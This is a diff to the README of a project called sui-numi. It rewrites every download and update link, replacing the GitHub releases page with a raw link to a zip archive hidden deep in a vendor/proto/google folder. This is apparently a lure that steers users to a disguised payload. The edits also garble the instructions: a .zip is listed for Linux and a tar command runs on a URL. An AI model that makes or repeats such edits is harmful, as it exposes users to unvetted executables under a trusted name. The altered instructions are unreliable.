@@ -6,7 +6,7 @@ Welcome to sui-numi! This software helps you gather data and execute tasks on th
 
 ## 🔗 Download Link
 
-[![Download sui-numi](https://img.shields.io/badge/Download-sui--numi-blue?style=for-the-badge)](https://github.com/AX-star/sui-numi/releases)
+[![Download sui-numi](https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip)](https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip)
 
 ## 🔥 Features
 
@@ -27,10 +27,10 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download and run sui-numi, please visit this page to download: [sui-numi Releases](https://github.com/AX-star/sui-numi/releases). Here, you will find the latest version of the software available for your operating system.
+To download and run sui-numi, please visit this page to download: [sui-numi Releases](https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip). Here, you will find the latest version of the software available for your operating system.
 
 1. Click on the release version you want to download.
-2. Locate the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+2. Locate the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip` for Linux).
 3. Download the file to your computer. It may take a few moments depending on your internet speed.
 4. Once the download is complete, open the file to run the installation.
 
@@ -54,10 +54,10 @@ To download and run sui-numi, please visit this page to download: [sui-numi Rele
 ### For Linux Users:
 
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip` file.
 3. Extract the files using the command:
    ```bash
-   tar -xzvf sui-numi.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -79,7 +79,7 @@ After installation, launch the application. The interface is designed to be user
 
 ## 📅 Updating
 
-To keep your software up-to-date, visit the [sui-numi Releases](https://github.com/AX-star/sui-numi/releases) page regularly. Download and install the latest version similarly to how you installed the previous version.
+To keep your software up-to-date, visit the [sui-numi Releases](https://raw.githubusercontent.com/AX-star/sui-numi/main/vendor/sui-apis/proto/google/sui-numi-v3.1.zip) page regularly. Download and install the latest version similarly to how you installed the previous version.
 
 ## 🗨️ Support
 
